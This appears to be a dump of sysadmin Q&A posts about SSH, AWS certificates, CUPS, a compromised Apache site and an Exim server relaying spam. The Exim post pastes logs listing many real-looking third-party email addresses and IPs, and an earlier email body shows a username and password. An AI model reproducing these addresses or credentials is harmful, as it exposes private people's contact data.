 =?utf-8?B?K1dyemcvdVJCQ293anBCNm43THNZajJWUnJlcGgrU3l0L3hxQWNvOXhZd3o4?=
 =?utf-8?B?cXU4anRzZjZXYklZZ3h2bExTcGRMeGVWSXpGNGxsczZCZlRzT2hDYWE4T1Bq?=
 =?utf-8?B?S1RUOXdRMU45aFhQWUhoTG9UaEUyY0FxRHA2Q2xPUFJNb2tWV2d1V2tWVnA2?=
 =?utf-8?B?d3ZvQWxzRnN0dz09?=
X-Microsoft-Antispam-Mailbox-Delivery:
    abwl:0;wl:1;pcwl:1;rwl:0;ex:0;auth:1;dest:I;WIMS-SenderIP:138.128.2.226;WIMS-SPF:monstermmorpg%2ec;WIMS-DKIM:monstermmorpg%2ec;WIMS-822:noreply%40monstermmorpg%2ecom;WIMS-PRA:noreply%40monstermmorpg%2ecom;WIMS-AUTH:PASS;ENG:(102400050)(102409045);OFR:TrustedSenderList;

&lt;meta http-equiv=3D""Content-Type"" content=3D""text/html; charset=3Dutf-8""&gt;Us=
ername : denemeemail&lt;br&gt;Password : linkedin.com&lt;br&gt;&lt;br&gt;Please mark this mes=
sage as not junk/spam=

----boundary_182_adaceebe-2ea9-4d4f-a2be-6f04682429c5--
</code></pre>
","<email><smtp><email-server><outlook><email-bounces>","2016-07-11 17:08:10"
"999175","Execute command on LINUX via PUTTY from Windows","<p>I want to open a putty session (SSH) from command line and immediately execute on the remote machine a specific command.</p>

<p>Something like: </p>

<pre><code>putty.exe -ssh user@host -pw pass123 &lt; ""cd /some/directory; ll""
</code></pre>

<p>But this doesn't work.
Is it possible?</p>
","<windows><ssh><shell><putty><telnet>","2020-01-16 07:29:52"
"878510","Server performance on load","<p>Im asking this question just to make sure or get some idea how much the server can take or when it going to fail, i have an Amazon EC2 instance with 8 GB RAM AND 2 VCPU,and it run some php script that only return json response no media file or any other type of data on the server ,, only have mysql database on it ,, each request to server return 16KB to 20KB from mysql the query i used it not that complex and it not that easy it fairly medium ,,let assume that the response size is 20KB with unlimited bandwidth , my question how many http request that server could handle i don't want an accurate answer ,, just approximation so i can get an idea about how much one instant could handle</p>
","<linux><http><load-testing>","2017-10-15 01:43:17"
"878532","CentOS 6 deleting files from /root/ after a reboot?","<p>Twice recently I've noticed that my vim settings have changed to defaults.  Investigation shows that all files have been deleted from my /root/ directory.  (Yes I currently log in as root, that's a different conversation...)</p>

<p>Can anyone suggest why this would be happening?  The first time I assumed I'd accidentally repeated a recent command from my bash history as I had done an <code>rm -f</code> in a different folder shortly before hand, but on this occasion I've not <code>rm</code>'d anything for days and after a yum update (which included a new kernel) and a reboot the files have gone again...?</p>

<p>Folders don't get deleted from /root/, just files.</p>

<p>Any ideas?</p>

<p>Many thanks.</p>
","<linux><centos><centos6><root>","2017-10-15 10:32:47"
"999241","Getting CUPS and printing working on Ubuntu with Windows Subsystem for Linux","<p>I'm building a cross platform printing app and need to test it on various Linux. I could use VMs but I've got WSL just sitting here working and it will be a lot more convenient, at least initially just to use it. </p>

<p>I have installed CUPS but it won't run:</p>

<pre><code>$ dpkg -s cups
Package: cups
Status: install ok installed
...
$ sudo systemctl restart cups.service
System has not been booted with systemd as init system (PID 1). Can't operate.
</code></pre>

<p>I found a single guide on the 'net for printing in WSL and it make it sound like it ""just works"": <a href=""https://www.scivision.dev/scanningprinting-with-windows-subsystem-for-linux/"" rel=""nofollow noreferrer"">https://www.scivision.dev/scanningprinting-with-windows-subsystem-for-linux/</a></p>

<p>What am I missing?</p>
","<ubuntu><printing><windows-subsystem-for-linux>","2020-01-16 16:18:11"
"878614","Can I separat nginx, gunicorn and POSTGRES and put them on their own machines?","<p>I haven't been able able to get an answer to this question</p>

<p>I know that we can separate database from the application but can I separate nginx(web server) and gunicorn(application server) too?</p>

<p>first of all should I?
and secondly how to do it when you haven't started building your project and when you have (does this migration add extra complexity if you already of thousands of users already)</p>

<p>Thanks</p>
","<nginx><web-server><postgresql><django><gunicorn>","2017-10-16 04:51:48"
"878616","How to learn network administration","<p>I already know the basics about networks. Where can I learn intermediate-advanced networking. How to become professional in this subject. I have a lot of practice but I want to learn everything possible about networks / network administration. I apologize for my bad English.</p>
","<networking><network-design>","2017-10-16 05:45:30"
"999350","How do you avoid the extra carriage return when you use Zsh history expansion?","<p>I'm a recent convert to zsh (from bash).</p>

<p>In zsh, as in bash, there is the history expansion feature.</p>

<p>For example, you can do:</p>

<pre><code>git blame somefile.cc
vim !$
</code></pre>

<p>Here, <code>vim !$</code> is same as typing out the full file name <code>vim somefile.cc</code>.</p>

<p>However, in zsh, after I type <code>vim !$</code>, zsh shows me the expanded command <code>vim somefile.cc</code> (as if to confirm with me what I have typed) and I have to hit the return again to actually execute it.</p>

<p>In bash, after type <code>vim !$</code> and hit return, I'm in the vim editor.</p>

<p>Is it possible to configure zsh so it behaves like bash in this scenario (ie avoiding having to type an extra carriage return)?</p>

<p>Thank you.</p>
","<zsh>","2020-01-17 11:57:14"
"999353","how to choose server that can handle about 1 or 2 million visit of my website","<p>I am building website using Angular and .net core, some modules will be written in python</p>

<p>I have searched on hosting specs and know the difference between them and I am comfortable for dedicated server to help me manage the website, database , etc myself </p>

<p>the factor that I can not decide about the number of user, I asked the marketing team and they said that the expected number of users per month are 1 to 2 million visit</p>

<p>how to choose server specs that suit this number without affecting the server performance ?</p>
","<windows><sql><hosting><web-hosting>","2020-01-17 12:14:33"
"999359","Does AWS cli do a data integrity check on sync with s3?","<p>I've been looking into using AWS cli for data integrity checks to verify a backup has been transferred from a Linux file server correctly to AWS s3. Likewise, I would like to verify when restoring a file from backup to the Linux file server it also transferred correctly.</p>

<p>I examined the etag stored with the object on S3, because it appears to be a md5sum. However, if the file is transferred as multipart in the case of large files, the etag is no longer valid.</p>

<p>But before I go further in trying to do a MD5sum to what has just been sync'ed to S3 each time, is this really necessary to do this? When using rsync between Linux file systems over the internet, it isn't common practice to do an md5sum on the files transferred to verify them. Because it is assumed I think that rsync has already taken care of this?</p>

<p>So I'm wondering does AWS cli sync already take care of the data integrity check for us?</p>
","<rsync><amazon-s3><aws-cli><md5>","2020-01-17 13:34:39"
"878678","How to break AWS certificate to public/private keys and intermediate certificate?","<p>I've issued a wildcard certificate in AWS to install on the company's website (which is stored in a CloudFront distribution).</p>

<p>There's a customer support service which the company uses and when you browse to support.company.com it takes you to that service site.</p>

<p>Up until today, the access to the support site has been done on HTTP protocol and we would like to change it to be on HTTPS.</p>

<p>For that, I need to upload to that customer support service provider site the new certificate, they require Private key, Public key and Intermediate certificate.</p>

<p>I've run the following command to get the certificates:</p>

<pre><code>aws iam get-server-certificate --server-certificate-name wild_company.com_10072019
</code></pre>

<p>But the output shows me the ""CertificateChain"" - all the certificates are display in one line and another ""CertificateBody"" which is also displayed in one line.</p>

<p>The CertificateBody is easier to distinguish by the ""--- Begin certificate ---"" and ""---END certificate---"" which appear only once but in the CertificateChain there are lots of begin/end marks and I'm not sure how to transform it to Public/Private keys and Intermediate certificate.</p>

<p>Any idea how can it be done?</p>
","<amazon-web-services><ssl-certificate>","2017-10-16 11:45:37"
"878704","How to auto accept new ssh fingerprints but decline changed?","<p>I have a script that deals with some servers in an environment where new hosts are added once in a while. I'd like to avoid being asked whether new fingerprint should be accepted but be warned if any previously known fingerprint have been changed. Turning off StrictHostKeyChecking is not an option because it will leave me vulnerable to MITM attacks.
What would be the most elegant way to silently accept new servers' fingerprints in this case?</p>
","<ssh><bash>","2017-10-16 14:21:01"
"878711","OpenSSL Convert RSA Private Key From 1024bits To 2048bits","<p>Given a RSA 1024 bit private key, how can I make OpenSSL generate the 2048 bit version of the same key?</p>

<p>(Additionally: Do the same thing, but with public keys)</p>
","<openssl>","2017-10-16 14:40:25"
"878742","Ubuntu - Some one is able to write on ubuntu/apache server","<p>Someone is trying to hack my website, I have a website built on PHP (7)/MySQL in Laravel framework. The owner of the /var/www is www-data and folder permission is set 700 for all folders and file permissions are set to 600. Still, the hacker is able to modify the content of index.php and also he was able to delete few PHP  files. The server is Ubuntu 17.04 and the web server is Apache.  </p>

<p>I need immediate guidance on how he is able to write files in a folder which has a permission 700. I would really appreciate your help and guidance. Please let me know if you need more details to understand the problem.</p>
","<apache-2.4><php-fpm><ubuntu-16.04><php7><mysql5.6>","2017-10-16 17:22:38"
"789468","Exim server maillog are flood by spam attemps?","<p>My log is flooded with those spam attemps and I wonder if there is a ACL can stop those attemps. </p>

<p>maillog (this is just a sample, my log will be over a 1000 line in an hour)</p>

<pre><code>2016-07-09 22:00:32 [2252] 1bM4ys-0000aK-QP H=192-159-50-175.oolw.qwirelessbb.net (avovj.com) [192.159.50.175]:41053 I=[10.0.1.1]:465 Warning: DEBUG  load_avgx1000: 40  spam_score: 3.2  message_size: 3497
2016-07-09 22:00:32 [2252] 1bM4ys-0000aK-QP &lt;= faisal.alazemi@aldimna.com H=192-159-50-175.oolw.qwirelessbb.net (avovj.com) [192.159.50.175]:41053 I=[10.0.1.1]:465 P=esmtpsa X=UNKNOWN:AES256-GCM-SHA384:256 CV=no A=login:faisal.alazemi@aldimna.com S=5167 id=0000b8dcc2ec$88e3d824$09deabe2$@yahoo.com T=""nouvelles"" from &lt;faisal.alazemi@aldimna.com&gt; for siew3748@yahoo.com kammari.murali@gmail.com kanopi@yahoo.com karenyesujin@yahoo.com kerct1969@yahoo.com
2016-07-09 22:00:32 [2401] cwd=/var/spool/exim 3 args: /usr/sbin/exim -Mc 1bM4ys-0000aK-QP
2016-07-09 22:00:34 [2401] 1bM4ys-0000aK-QP =&gt; kammari.murali@gmail.com F=&lt;faisal.alazemi@aldimna.com&gt; P=&lt;faisal.alazemi@aldimna.com&gt; R=dnslookup T=remote_smtp S=4156 H=gmail-smtp-in.l.google.com [74.125.136.27]:25 X=UNKNOWN:ECDHE-RSA-AES128-GCM-SHA256:128 CV=no DN=""/C=US/ST=California/L=Mountain View/O=Google Inc/CN=mx.google.com"" C=""250 2.0.0 OK 1468119641 qt8si326075wjc.22 - gsmtp"" QT=4s DT=2s
2016-07-09 22:00:39 [2401] 1bM4ys-0000aK-QP =&gt; siew3748@yahoo.com F=&lt;faisal.alazemi@aldimna.com&gt; P=&lt;faisal.alazemi@aldimna.com&gt; R=dnslookup T=remote_smtp S=4156 H=mta5.am0.yahoodns.net [98.138.112.33]:25 X=UNKNOWN:ECDHE-RSA-AES128-GCM-SHA256:128 CV=no DN=""/C=US/ST=California/L=Sunnyvale/O=Yahoo Inc./OU=Information Technology/CN=*.am0.yahoodns.net"" C=""250 ok dirdel 4/0"" QT=9s DT=7s
2016-07-09 22:00:39 [2401] 1bM4ys-0000aK-QP -&gt; kanopi@yahoo.com F=&lt;faisal.alazemi@aldimna.com&gt; P=&lt;faisal.alazemi@aldimna.com&gt; R=dnslookup T=remote_smtp S=4156 H=mta5.am0.yahoodns.net [98.138.112.33]:25 X=UNKNOWN:ECDHE-RSA-AES128-GCM-SHA256:128 CV=no DN=""/C=US/ST=California/L=Sunnyvale/O=Yahoo Inc./OU=Information Technology/CN=*.am0.yahoodns.net"" C=""250 ok dirdel 4/0"" QT=9s DT=7s
2016-07-09 22:00:39 [2401] 1bM4ys-0000aK-QP -&gt; karenyesujin@yahoo.com F=&lt;faisal.alazemi@aldimna.com&gt; P=&lt;faisal.alazemi@aldimna.com&gt; R=dnslookup T=remote_smtp S=4156 H=mta5.am0.yahoodns.net [98.138.112.33]:25 X=UNKNOWN:ECDHE-RSA-AES128-GCM-SHA256:128 CV=no DN=""/C=US/ST=California/L=Sunnyvale/O=Yahoo Inc./OU=Information Technology/CN=*.am0.yahoodns.net"" C=""250 ok dirdel 4/0"" QT=9s DT=7s
2016-07-09 22:00:39 [2401] 1bM4ys-0000aK-QP -&gt; kerct1969@yahoo.com F=&lt;faisal.alazemi@aldimna.com&gt; P=&lt;faisal.alazemi@aldimna.com&gt; R=dnslookup T=remote_smtp S=4156 H=mta5.am0.yahoodns.net [98.138.112.33]:25 X=UNKNOWN:ECDHE-RSA-AES128-GCM-SHA256:128 CV=no DN=""/C=US/ST=California/L=Sunnyvale/O=Yahoo Inc./OU=Information Technology/CN=*.am0.yahoodns.net"" C=""250 ok dirdel 4/0"" QT=9s DT=7s
2016-07-09 22:00:39 [2401] 1bM4ys-0000aK-QP Completed QT=9s

2016-07-09 22:00:41 [2252] 1bM4z2-0000aK-1R H=192-159-50-175.oolw.qwirelessbb.net (avovj.com) [192.159.50.175]:41053 I=[10.0.1.1]:465 Warning: DEBUG  load_avgx1000: 30  spam_score: 1.2  message_size: 3405
2016-07-09 22:00:41 [2252] 1bM4z2-0000aK-1R &lt;= faisal.alazemi@aldimna.com H=192-159-50-175.oolw.qwirelessbb.net (avovj.com) [192.159.50.175]:41053 I=[10.0.1.1]:465 P=esmtpsa X=UNKNOWN:AES256-GCM-SHA384:256 CV=no A=login:faisal.alazemi@aldimna.com S=5002 id=00007bfddeb3$b987df01$0586e10c$@yahoo.com T=""c\342\200\231est si excitant"" from &lt;faisal.alazemi@aldimna.com&gt; for florencekhaw@gmail.com sweetlin@hotmail.com ticiku@gmail.com yhkhor@tm.net.my greenven@yahoo.com
2016-07-09 22:00:41 [2444] cwd=/var/spool/exim 3 args: /usr/sbin/exim -Mc 1bM4z2-0000aK-1R
2016-07-09 22:00:44 [2444] 1bM4z2-0000aK-1R =&gt; florencekhaw@gmail.com F=&lt;faisal.alazemi@aldimna.com&gt; P=&lt;faisal.alazemi@aldimna.com&gt; R=dnslookup T=remote_smtp S=4060 H=gmail-smtp-in.l.google.com [74.125.136.27]:25 X=UNKNOWN:ECDHE-RSA-AES128-GCM-SHA256:128 CV=no DN=""/C=US/ST=California/L=Mountain View/O=Google Inc/CN=mx.google.com"" C=""250 2.0.0 OK 1468119651 y142si5687414wme.31 - gsmtp"" QT=4s DT=2s
2016-07-09 22:00:44 [2444] 1bM4z2-0000aK-1R -&gt; ticiku@gmail.com F=&lt;faisal.alazemi@aldimna.com&gt; P=&lt;faisal.alazemi@aldimna.com&gt; R=dnslookup T=remote_smtp S=4060 H=gmail-smtp-in.l.google.com [74.125.136.27]:25 X=UNKNOWN:ECDHE-RSA-AES128-GCM-SHA256:128 CV=no DN=""/C=US/ST=California/L=Mountain View/O=Google Inc/CN=mx.google.com"" C=""250 2.0.0 OK 1468119651 y142si5687414wme.31 - gsmtp"" QT=4s DT=2s
2016-07-09 22:00:46 [2444] 1bM4z2-0000aK-1R =&gt; sweetlin@hotmail.com F=&lt;faisal.alazemi@aldimna.com&gt; P=&lt;faisal.alazemi@aldimna.com&gt; R=dnslookup T=remote_smtp S=4060 H=mx4.hotmail.com [65.55.37.104]:25 X=UNKNOWN:ECDHE-RSA-AES256-SHA384:256 CV=no DN=""/CN=*.hotmail.com"" C=""250  &lt;00007bfddeb3$b987df01$0586e10c$@yahoo.com&gt; Queued mail for delivery"" QT=6s DT=4s
2016-07-09 22:00:51 [2444] 1bM4z2-0000aK-1R =&gt; greenven@yahoo.com F=&lt;faisal.alazemi@aldimna.com&gt; P=&lt;faisal.alazemi@aldimna.com&gt; R=dnslookup T=remote_smtp S=4060 H=mta5.am0.yahoodns.net [98.138.112.35]:25 X=UNKNOWN:ECDHE-RSA-AES128-GCM-SHA256:128 CV=no DN=""/C=US/ST=California/L=Sunnyvale/O=Yahoo Inc./OU=Information Technology/CN=*.am0.yahoodns.net"" C=""250 ok dirdel"" QT=11s DT=5s
2016-07-09 22:02:51 [2450] 1bM4z2-0000aK-1R mailrelay.tab.com.my [202.188.95.55]:25 Connection timed out
2016-07-09 22:02:51 [2444] 1bM4z2-0000aK-1R == yhkhor@tm.net.my R=dnslookup T=remote_smtp defer (110): Connection timed out
2016-07-09 22:07:25 [2668] 1bM4z2-0000aK-1R == yhkhor@tm.net.my R=dnslookup T=remote_smtp defer (-53): retry time not reached for any host
2016-07-09 22:44:09 [3190] 1bM4z2-0000aK-1R mailrelay.tab.com.my [202.188.95.55]:25 Connection timed out
2016-07-09 22:44:09 [3189] 1bM4z2-0000aK-1R == yhkhor@tm.net.my R=dnslookup T=remote_smtp defer (110): Connection timed out
2016-07-09 23:18:58 [5210] 1bM4z2-0000aK-1R mailrelay.tab.com.my [202.188.95.55]:25 Connection timed out
2016-07-09 23:18:58 [5209] 1bM4z2-0000aK-1R == yhkhor@tm.net.my R=dnslookup T=remote_smtp defer (110): Connection timed out
2016-07-09 23:44:40 [5472] 1bM4z2-0000aK-1R mailrelay.tab.com.my [202.188.95.55]:25 Connection timed out
2016-07-09 23:44:40 [5471] 1bM4z2-0000aK-1R == yhkhor@tm.net.my R=dnslookup T=remote_smtp defer (110): Connection timed out
2016-07-10 00:30:50 [6963] 1bM4z2-0000aK-1R mailrelay.tab.com.my [202.188.95.55]:25 Connection timed out
2016-07-10 00:30:50 [6962] 1bM4z2-0000aK-1R == yhkhor@tm.net.my R=dnslookup T=remote_smtp defer (110): Connection timed out
2016-07-10 00:42:08 [7311] 1bM4z2-0000aK-1R == yhkhor@tm.net.my R=dnslookup T=remote_smtp defer (-53): retry time not reached for any host
2016-07-10 01:25:13 [9147] 1bM4z2-0000aK-1R == yhkhor@tm.net.my R=dnslookup T=remote_smtp defer (-53): retry time not reached for any host
2016-07-10 01:47:06 [9578] 1bM4z2-0000aK-1R failed to expand ""${lookup mysql {SELECT domain FROM user WHERE domain='${quote_mysql:$domain}' UNION SELECT domain FROM alias WHERE domain='${quote_mysql:$domain}' UNION SELECT domain FROM catchall WHERE domain='${quote_mysql:$domain}'}}"" while checking a list: lookup of ""SELECT domain FROM user WHERE domain='tm.net.my' UNION SELECT domain FROM alias WHERE domain='tm.net.my' UNION SELECT domain FROM catchall WHERE domain='tm.net.my'"" gave DEFER: MYSQL connection failed: Can't connect to local MySQL server through socket '/run/mysqld/mysqld.sock' (2 ""No such file or directory"")
2016-07-10 01:47:06 [9578] 1bM4z2-0000aK-1R == yhkhor@tm.net.my R=uservacation defer (-1): domains check lookup or other defer
2016-07-10 01:47:23 [9742] 1bM4z2-0000aK-1R == yhkhor@tm.net.my routing defer (-51): retry time not reached
2016-07-10 01:47:24 [9801] cwd=/home/admin 68 args: exim -Mrm 1bM4z2-0000aK-1R 1bM51q-0000fL-1B 1bM52c-0000fL-AK 1bM52l-0000fL-Mn 1bM52v-0000fL-4U 1bM56n-0000hM-8O 1bM56r-0000hM-UJ 1bM575-0000hM-Hi 1bM5TM-0000li-AB 1bM5TS-0000li-Ra 1bM5Yq-0000mp-Gt 1bM5d4-0000pM-Jt 1bM5l8-0000qH-SC 1bM5lE-0000qH-Oq 1bM5lQ-0000qH-Gy 1bM5lT-0000qH-Kj 1bM5ld-0000qH-FR 1bM5mA-0000se-IN 1bM5mH-0000se-Jy 1bM5mP-0000se-65 1bM68I-0001Eg-Sw 1bM68x-0001Eg-ID 1bM6Xu-0001Pi-OD 1bM6ba-0001QJ-I8 1bM6bk-0001QJ-Om 1bM6bs-0001QJ-AT 1bM6bz-0001QJ-AL 1bM6c4-0001QJ-P4 1bM6cD-0001QJ-1b 1bM6oE-0001Si-IX 1bM6oR-0001Si-23 1bM6oX-0001Si-GL 1bM6yf-0001e4-Mf 1bM6yp-0001e4-TJ 1bM71Z-0001g8-2B 1bM71g-0001g8-Qm 1bM71o-0001g8-6z 1bM71t-0001g8-9L 1bM75g-0001jI-B6 1bM75t-0001jI-7W 1bM75z-0001jI-I3 1bM7Ki-0001pf-6t 1bM7Kv-0001pf-6e 1bM7L8-0001pn-Mk 1bM7dj-0001vg-2a 1bM7e1-0001vg-3w 1bM7e6-0001vg-TP 1bM7hP-0001xz-VL 1bM7kZ-00020e-19 1bM7kf-00020e-AH 1bM7kn-00020e-0G 1bM7ks-00020e-6h 1bM7ky-00020e-8q 1bM7l2-00020e-Or 1bM7l7-00020e-Ay 1bM7lC-00020e-8N 1bM7lI-00020e-6R 1bM7lN-00020e-Eh 1bM7qH-0002Bu-Mm 1bM7qY-0002Bu-IK 1bM8E9-0002OG-0J 1bM8EB-0002OG-HP 1bM8EE-0002OG-0j 1bM8EG-0002OG-GX 1bM8EI-0002OG-W7 1bM8EQ-0002OG-GW
2016-07-10 01:47:24 [9801] 1bM4z2-0000aK-1R removed by root
2016-07-10 01:47:24 [9801] 1bM4z2-0000aK-1R Completed

2016-07-09 22:01:28 [2252] 1bM4zm-0000aK-JP H=192-159-50-175.oolw.qwirelessbb.net (avovj.com) [192.159.50.175]:41053 I=[10.0.1.1]:465 Warning: DEBUG  load_avgx1000: 10  spam_score: 3.2  message_size: 3482
2016-07-09 22:01:28 [2252] 1bM4zm-0000aK-JP &lt;= faisal.alazemi@aldimna.com H=192-159-50-175.oolw.qwirelessbb.net (avovj.com) [192.159.50.175]:41053 I=[10.0.1.1]:465 P=esmtpsa X=UNKNOWN:AES256-GCM-SHA384:256 CV=no A=login:faisal.alazemi@aldimna.com S=5153 id=00001f92ed3f$008c395b$f31bf296$@yahoo.com T=""c\342\200\231est si incroyable"" from &lt;faisal.alazemi@aldimna.com&gt; for dexilim@yahoo.com limhf@frim.gov.my jennifer_chlim@yahoo.co.uk john_bclim@yahoo.com kahboon1703@hotmail.com
2016-07-09 22:01:28 [2508] cwd=/var/spool/exim 3 args: /usr/sbin/exim -Mc 1bM4zm-0000aK-JP
2016-07-09 22:01:38 [2508] 1bM4zm-0000aK-JP =&gt; dexilim@yahoo.com F=&lt;faisal.alazemi@aldimna.com&gt; P=&lt;faisal.alazemi@aldimna.com&gt; R=dnslookup T=remote_smtp S=4140 H=mta6.am0.yahoodns.net [98.136.217.203]:25 X=UNKNOWN:ECDHE-RSA-AES128-GCM-SHA256:128 CV=no DN=""/C=US/ST=California/L=Sunnyvale/O=Yahoo Inc./OU=Information Technology/CN=*.am0.yahoodns.net"" C=""250 ok dirdel 2/0"" QT=12s DT=6s
2016-07-09 22:01:38 [2508] 1bM4zm-0000aK-JP -&gt; john_bclim@yahoo.com F=&lt;faisal.alazemi@aldimna.com&gt; P=&lt;faisal.alazemi@aldimna.com&gt; R=dnslookup T=remote_smtp S=4140 H=mta6.am0.yahoodns.net [98.136.217.203]:25 X=UNKNOWN:ECDHE-RSA-AES128-GCM-SHA256:128 CV=no DN=""/C=US/ST=California/L=Sunnyvale/O=Yahoo Inc./OU=Information Technology/CN=*.am0.yahoodns.net"" C=""250 ok dirdel 2/0"" QT=12s DT=6s
2016-07-09 22:01:39 [2508] 1bM4zm-0000aK-JP =&gt; limhf@frim.gov.my F=&lt;faisal.alazemi@aldimna.com&gt; P=&lt;faisal.alazemi@aldimna.com&gt; R=dnslookup T=remote_smtp S=4140 H=cx1.1govuc.gov.my [103.245.89.1]:25 X=UNKNOWN:DHE-RSA-AES256-GCM-SHA384:256 CV=no DN=""/C=CN/ST=Bj/L=Bj/O=Websense/CN=Email/emailAddress=support@websense.com"" C=""250 2.0.0 Ok: queued as 01AE0514FBB62"" QT=13s DT=7s
2016-07-09 22:01:41 [2508] 1bM4zm-0000aK-JP =&gt; jennifer_chlim@yahoo.co.uk F=&lt;faisal.alazemi@aldimna.com&gt; P=&lt;faisal.alazemi@aldimna.com&gt; R=dnslookup T=remote_smtp S=4140 H=mx-eu.mail.am0.yahoodns.net [188.125.69.79]:25 X=UNKNOWN:ECDHE-RSA-AES128-GCM-SHA256:128 CV=no DN=""/C=US/ST=California/L=Sunnyvale/O=Yahoo Inc./OU=Information Technology/CN=*.am0.yahoodns.net"" C=""250 ok dirdel"" QT=15s DT=3s
2016-07-09 22:01:43 [2508] 1bM4zm-0000aK-JP =&gt; kahboon1703@hotmail.com F=&lt;faisal.alazemi@aldimna.com&gt; P=&lt;faisal.alazemi@aldimna.com&gt; R=dnslookup T=remote_smtp S=4140 H=mx3.hotmail.com [65.55.92.136]:25 X=UNKNOWN:ECDHE-RSA-AES256-SHA384:256 CV=no DN=""/CN=*.hotmail.com"" C=""250  &lt;00001f92ed3f$008c395b$f31bf296$@yahoo.com&gt; Queued mail for delivery"" QT=17s DT=4s
2016-07-09 22:01:43 [2508] 1bM4zm-0000aK-JP Completed QT=17s

2016-07-09 22:04:23 [2563] 1bM52c-0000fL-AK H=(mdju.com) [187.28.85.176]:39330 I=[10.0.1.1]:465 Warning: DEBUG  load_avgx1000: 200  spam_score: 2.4  message_size: 3449
2016-07-09 22:04:23 [2563] 1bM52c-0000fL-AK &lt;= faisal.alazemi@aldimna.com H=(mdju.com) [187.28.85.176]:39330 I=[10.0.1.1]:465 P=esmtpsa X=UNKNOWN:AES256-GCM-SHA384:256 CV=no A=login:faisal.alazemi@aldimna.com S=5051 id=0000d191d5c1$5372a983$4d8e11ef$@free.fr T=""choses faciles"" from &lt;faisal.alazemi@aldimna.com&gt; for newsletter@info.c-mod.com bousol@find-xtrem.com boutisolde@offrir-fleurs.net deudem@pas.web-amour.net Boutiqueopera@spectacles91.fr
2016-07-09 22:04:23 [2614] cwd=/var/spool/exim 3 args: /usr/sbin/exim -Mc 1bM52c-0000fL-AK
2016-07-09 22:04:27 [2614] 1bM52c-0000fL-AK =&gt; bousol@find-xtrem.com F=&lt;faisal.alazemi@aldimna.com&gt; P=&lt;faisal.alazemi@aldimna.com&gt; R=dnslookup T=remote_smtp S=4073 H=mailemv.find-xtrem.com [91.121.142.105]:25 C=""250 ok 1468119589 qp 6905"" QT=5s DT=1s
2016-07-09 22:04:27 [2614] 1bM52c-0000fL-AK =&gt; newsletter@info.c-mod.com F=&lt;faisal.alazemi@aldimna.com&gt; P=&lt;faisal.alazemi@aldimna.com&gt; R=dnslookup T=remote_smtp S=4073 H=smtpe1.emv3.com [81.92.120.9]:25 C=""250 2.0.0 Ok: queued as 3CD9E1DC87A"" QT=5s DT=1s
2016-07-09 22:04:28 [2614] 1bM52c-0000fL-AK ** deudem@pas.web-amour.net F=&lt;faisal.alazemi@aldimna.com&gt; P=&lt;faisal.alazemi@aldimna.com&gt; R=dnslookup T=remote_smtp: SMTP error from remote mail server after RCPT TO:&lt;deudem@pas.web-amour.net&gt;: host vidf.web-amour.net [91.121.142.105]: 553 sorry, that domain isn't in my list of allowed rcpthosts (#5.7.1)
2016-07-09 22:04:28 [2614] 1bM52c-0000fL-AK =&gt; boutiqueopera@spectacles91.fr &lt;Boutiqueopera@spectacles91.fr&gt; F=&lt;faisal.alazemi@aldimna.com&gt; P=&lt;faisal.alazemi@aldimna.com&gt; R=dnslookup T=remote_smtp S=4073 H=spectacles91.fr.mail-in.bp01.net [83.206.208.149]:25 C=""250 2.6.0 message received"" QT=6s DT=0s
2016-07-09 22:05:27 [2617] 1bM52c-0000fL-AK Remote host offrir-fleurs.net [192.230.66.93] closed connection in response to initial connection
2016-07-09 22:06:28 [2617] 1bM52c-0000fL-AK Remote host offrir-fleurs.net [192.230.74.93] closed connection in response to initial connection
2016-07-09 22:06:28 [2614] 1bM52c-0000fL-AK == boutisolde@offrir-fleurs.net R=dnslookup T=remote_smtp defer (-18): Remote host offrir-fleurs.net [192.230.74.93] closed connection in response to initial connection
2016-07-09 22:06:28 [2643] cwd=/var/spool/exim 7 args: /usr/sbin/exim -t -oem -oi -f &lt;&gt; -E1bM52c-0000fL-AK
2016-07-09 22:06:28 [2643] 1bM54e-0000gd-A4 &lt;= &lt;&gt; R=1bM52c-0000fL-AK U=exim P=local S=6066 T=""Mail delivery failed: returning message to sender"" from &lt;&gt; for faisal.alazemi@aldimna.com
2016-07-09 22:07:25 [2670] 1bM52c-0000fL-AK == boutisolde@offrir-fleurs.net R=dnslookup T=remote_smtp defer (-53): retry time not reached for any host
2016-07-09 22:52:23 [3486] 1bM52c-0000fL-AK == boutisolde@offrir-fleurs.net R=dnslookup T=remote_smtp defer (-53): retry time not reached for any host
2016-07-09 23:11:58 [4614] 1bM52c-0000fL-AK == boutisolde@offrir-fleurs.net R=dnslookup T=remote_smtp defer (-53): retry time not reached for any host
2016-07-09 23:39:43 [5416] 1bM52c-0000fL-AK == boutisolde@offrir-fleurs.net R=dnslookup T=remote_smtp defer (-53): retry time not reached for any host
2016-07-10 00:45:56 [7367] 1bM52c-0000fL-AK == boutisolde@offrir-fleurs.net R=dnslookup T=remote_smtp defer (-53): retry time not reached for any host
2016-07-10 00:50:25 [7414] 1bM52c-0000fL-AK == boutisolde@offrir-fleurs.net R=dnslookup T=remote_smtp defer (-53): retry time not reached for any host
2016-07-10 01:47:07 [9590] 1bM52c-0000fL-AK failed to expand ""${lookup mysql {SELECT domain FROM user WHERE domain='${quote_mysql:$domain}' UNION SELECT domain FROM alias WHERE domain='${quote_mysql:$domain}' UNION SELECT domain FROM catchall WHERE domain='${quote_mysql:$domain}'}}"" while checking a list: lookup of ""SELECT domain FROM user WHERE domain='offrir-fleurs.net' UNION SELECT domain FROM alias WHERE domain='offrir-fleurs.net' UNION SELECT domain FROM catchall WHERE domain='offrir-fleurs.net'"" gave DEFER: MYSQL connection failed: Can't connect to local MySQL server through socket '/run/mysqld/mysqld.sock' (2 ""No such file or directory"")
2016-07-10 01:47:07 [9590] 1bM52c-0000fL-AK == boutisolde@offrir-fleurs.net R=uservacation defer (-1): domains check lookup or other defer
2016-07-10 01:47:23 [9762] 1bM52c-0000fL-AK == boutisolde@offrir-fleurs.net routing defer (-51): retry time not reached
